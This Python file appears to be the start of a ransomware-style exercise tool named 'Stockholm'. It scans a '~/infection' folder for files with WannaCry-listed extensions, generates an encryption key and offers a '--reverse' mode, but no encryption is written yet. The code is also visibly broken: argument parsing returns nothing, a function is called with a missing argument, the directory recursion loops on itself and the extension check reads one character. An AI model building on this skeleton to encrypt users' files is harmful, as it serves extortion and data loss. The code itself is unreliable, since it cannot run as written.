import argparse
import os
import json

VERSION = "1.0.0"
TARGETDIR = "~/infection"
EXT = ".ft"
Key = ""

def get_targetdir():
    if not os.path.exists(TARGETDIR):
        print("no target directory. Stop.")
        exit(1)
    return TARGETDIR

def log(silent, msg):
    if (silent):
        return
    print(msg)

def get_targetfiles(dir_path, extends, targets):
    cur_dir = os.listdir(dir_path)
    for cur in cur_dir:
        filename = dir_path + "/" + cur
        if not os.path.isfile(filename):
            get_targetfiles(dir_path, extends, targets)
        cur_ext = filename.rfind(".")
        if cur_ext >= 0 and filename[cur_ext] in extends:
            targets.append(filename)
            
def load_extends():
    with open('wannacry_supported_extends', 'r', encoding='utf-8') as file:
        return json.load(file)
    

def stockholm(reverse, silent, key):
    if (key):
        Key = bytes.fromhex(key)
    else:
        Key = os.urandom(32)
    dir_path = get_targetdir()
    targets = []
    if reverse:
        get_targetfiles(dir_path, [EXT], targets)
    else:
        exts = load_extends()     
        get_targetfiles(dir_path, exts, targets)
    

def get_args():
    parser = argparse.ArgumentParser()

    parser.add_argument("--help", "-h", action="store_true", help="shows program's options")
    parser.add_argument("--version", "-v", action="store_true", help="shows programm's version")
    parser.add_argument("--reverse", "-r", action="store_true", help="to use with a key entered as argument to reverse the infection")
    parser.add_argument("--silent", "-s", action="store_true", help="no output will be produced")

def main():
    args = get_args()
    if (args.version):
        print(f"Stockholm version {VERSION}")

    try:
        stockholm(args.reverse, args.silent)

    except Exception as e:
        print(e)
        exit(1)


if __name__ == '__main__':
    main()